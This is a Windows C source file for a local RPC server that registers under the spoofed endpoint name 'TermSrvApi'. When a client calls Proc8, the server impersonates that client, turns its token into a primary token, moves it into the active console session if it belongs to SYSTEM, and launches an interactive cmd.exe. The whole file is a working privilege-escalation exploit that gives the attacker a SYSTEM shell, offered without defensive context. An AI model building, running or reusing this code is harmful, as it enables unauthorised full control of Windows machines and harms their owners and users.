#include <windows.h>
#include <stdio.h>
#include <stdarg.h>   // For va_list used by LogMessage
#include <stdlib.h>   // For exit, malloc, free
#include <rpc.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "ExampleInterface.h" 

#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "advapi32.lib")

// -----------------------------------------------------------------------------
// Logging
// -----------------------------------------------------------------------------
// All operational messages are written to this log file. Adjust as needed.
#define LOG_FILE "C:\\Windows\\Temp\\LRPC_Server.log"
FILE *logFile = NULL; // Unused global retained for compatibility

// LogMessage: simple file logger (append mode). No functional changes.
static void LogMessage(const char* format, ...) {
    FILE* fp = fopen(LOG_FILE, "a"); // Open file in append mode
    if (fp == NULL) {
        return; // If logging fails, don't affect functionality
    }

    va_list args;
    va_start(args, format);
    vfprintf(fp, format, args);
    va_end(args);

    fprintf(fp, "\n");   // Newline for readability
    fflush(fp);           // Ensure it's written
    fclose(fp);           // Close file
}

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------
// Determine whether the provided token belongs to the Local System account.
static BOOL IsSystemToken(HANDLE hToken) {
    DWORD cb = 0;
    PTOKEN_USER pUser = NULL;
    BYTE  sysSidBuf[SECURITY_MAX_SID_SIZE];
    DWORD sysSidSize = sizeof(sysSidBuf);
    BOOL  isSystem = FALSE;

    // First call gets required size
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &cb) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        LogMessage("IsSystemToken: GetTokenInformation(size) failed: %lu", GetLastError());
        return FALSE;
    }

    pUser = (PTOKEN_USER)LocalAlloc(LPTR, cb);
    if (!pUser) {
        LogMessage("IsSystemToken: LocalAlloc failed");
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenUser, pUser, cb, &cb)) {
        LogMessage("IsSystemToken: GetTokenInformation(data) failed: %lu", GetLastError());
        LocalFree(pUser);
        return FALSE;
    }

    // Create the well-known LocalSystem SID and compare
    if (CreateWellKnownSid(WinLocalSystemSid, NULL, sysSidBuf, &sysSidSize)) {
        isSystem = EqualSid(pUser->User.Sid, (PSID)sysSidBuf);
    } else {
        LogMessage("IsSystemToken: CreateWellKnownSid failed: %lu", GetLastError());
    }

    LocalFree(pUser);
    return isSystem;
}

// Spawns an interactive cmd.exe using the provided impersonation token.
static void SpawnCmdWithSystemToken(HANDLE hImpersonationToken) {
    HANDLE hPrimaryToken = NULL;
    DWORD dwSessionId = WTSGetActiveConsoleSessionId(); // Active user session
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    LPVOID lpEnvironment = NULL;

    LogMessage("SpawnCmdWithSystemToken: Enter");

    // Step 1: Duplicate the token to a primary token
    if (!DuplicateTokenEx(hImpersonationToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        LogMessage("DuplicateTokenEx failed: %lu", GetLastError());
        return;
    }
    LogMessage("DuplicateTokenEx: succeeded");

    // Step 2: If caller is SYSTEM, set token session to the active console session
    if (IsSystemToken(hImpersonationToken)) {
        if (!SetTokenInformation(hPrimaryToken, TokenSessionId, &dwSessionId, sizeof(DWORD))) {
            LogMessage("SetTokenInformation(TokenSessionId) failed: %lu", GetLastError());
            CloseHandle(hPrimaryToken);
            return;
        }
        LogMessage("SetTokenInformation(TokenSessionId): set to %lu", (unsigned long)dwSessionId);
    } else {
        LogMessage("Caller is not SYSTEM; skipping TokenSessionId update");
    }

    // Step 3: Create environment block for the new process
    if (!CreateEnvironmentBlock(&lpEnvironment, hPrimaryToken, TRUE)) {
        LogMessage("CreateEnvironmentBlock failed: %lu", GetLastError());
        CloseHandle(hPrimaryToken);
        return;
    }
    LogMessage("CreateEnvironmentBlock: succeeded");

    // Step 4: Start cmd.exe as SYSTEM (if SYSTEM) in the interactive session
    if (!CreateProcessAsUserW(
            hPrimaryToken,
            L"C:\\Windows\\System32\\cmd.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
            lpEnvironment,
            NULL,
            &si,
            &pi)) {
        LogMessage("CreateProcessAsUserW failed: %lu", GetLastError());
    } else {
        LogMessage("CreateProcessAsUserW: cmd.exe spawned successfully");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    LogMessage("SpawnCmdWithSystemToken: Exit");
}

// Impersonate the RPC client, obtain a token, and spawn cmd.exe.
static void ImpersonateAndRunCmd(void) {
    HANDLE hToken = NULL;

    LogMessage("ImpersonateAndRunCmd: Enter");

    // Step 1: Impersonate the RPC client
    if (RpcImpersonateClient(NULL) != RPC_S_OK) {
        LogMessage("RpcImpersonateClient failed");
        return;
    }
    LogMessage("RpcImpersonateClient: succeeded");

    // Step 2: Open the thread token for duplication/assignment
    BOOL gotToken = OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, FALSE, &hToken);
    LogMessage("OpenThreadToken: %s (err=%lu)", gotToken ? "succeeded" : "failed", gotToken ? 0UL : GetLastError());

    // Step 3: Attempt to spawn using whatever token we obtained (if any)
    SpawnCmdWithSystemToken(hToken);

    // Step 4: Revert to self
    if (RpcRevertToSelf() != RPC_S_OK) {
        LogMessage("RpcRevertToSelf: failed");
    } else {
        LogMessage("RpcRevertToSelf: succeeded");
    }

    // Cleanup
    if (hToken) {
        CloseHandle(hToken);
    }

    LogMessage("ImpersonateAndRunCmd: Exit");
}

// -----------------------------------------------------------------------------
// RPC Stubs
// -----------------------------------------------------------------------------
long Proc0(void)  { return RPC_S_OK; }
long Proc1(void)  { return RPC_S_OK; }
long Proc2(void)  { return RPC_S_OK; }
long Proc3(void)  { return RPC_S_OK; }
long Proc4(void)  { return RPC_S_OK; }
long Proc5(void)  { return RPC_S_OK; }
long Proc6(void)  { return RPC_S_OK; }
long Proc7(void)  { return RPC_S_OK; }

void Proc8(unsigned int level) {
    (void)level; // Unused parameter
    LogMessage("Proc8: invoked");
    ImpersonateAndRunCmd();
}

// -----------------------------------------------------------------------------
// Main entry
// -----------------------------------------------------------------------------
int main(void) {
    RPC_STATUS status;
    RPC_WSTR princName = NULL;

    LogMessage("Server starting up");

    // Query the default principal name using NTLM authentication
    status = RpcServerInqDefaultPrincNameW(RPC_C_AUTHN_WINNT, &princName);
    if (status == RPC_S_OK) {
        LogMessage("Default Principal Name: %ls", princName);
        // Free the allocated memory for the principal name
        RpcStringFreeW(&princName);
    } else {
        LogMessage("RpcServerInqDefaultPrincNameW failed: %lu", status);
    }

    // Register the protocol sequence
    LogMessage("RpcServerUseProtseqEpW: registering protocol sequence");
    status = RpcServerUseProtseqEpW(
        (RPC_WSTR)L"ncalrpc",             // Protocol sequence
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,   // Maximum concurrent calls
        (RPC_WSTR)L"TermSrvApi",            // Endpoint name
        NULL);                            // Security descriptor
    if (status) {
        LogMessage("RpcServerUseProtseqEpW returned 0x%lx", status);
        exit(status);
    }
    LogMessage("RpcServerUseProtseqEpW: succeeded");

    // Register the interface
    LogMessage("RpcServerRegisterIf2: registering interface");
    status = RpcServerRegisterIf2(
        ExampleInterface_v1_0_s_ifspec,  // Interface to register
        NULL,                            // UUID to associate with this interface
        NULL,                            // MgrTypeUuid
        0,                               // Flags
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,  // Max calls
        (unsigned)-1,                    // Max RPC size
        NULL);                           // Security callback
    if (status) {
        LogMessage("RpcServerRegisterIf2 returned 0x%lx", status);
        exit(status);
    }
    LogMessage("RpcServerRegisterIf2: succeeded");

    // Register authentication info (NTLM)
    LogMessage("RpcServerRegisterAuthInfoW: registering auth info");
    status = RpcServerRegisterAuthInfoW(
        NULL,
        RPC_C_AUTHN_WINNT,
        NULL,
        NULL);
    if (status) {
        LogMessage("RpcServerRegisterAuthInfoW returned 0x%lx", status);
        exit(status);
    }
    LogMessage("RpcServerRegisterAuthInfoW: succeeded");

    // Listen for RPC calls
    LogMessage("RpcServerListen: starting listener");
    status = RpcServerListen(
        1,                               // Minimum number of threads
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,  // Max concurrent calls
        FALSE);                          // Don't wait
    if (status) {
        LogMessage("RpcServerListen returned 0x%lx", status);
        exit(status);
    }

    LogMessage("Server is listening");
    return 0;
}

// -----------------------------------------------------------------------------
// MIDL memory helpers
// -----------------------------------------------------------------------------
void* __RPC_USER midl_user_allocate(size_t size) {
    return malloc(size);
}

void __RPC_USER midl_user_free(void* ptr) {
    free(ptr);
}
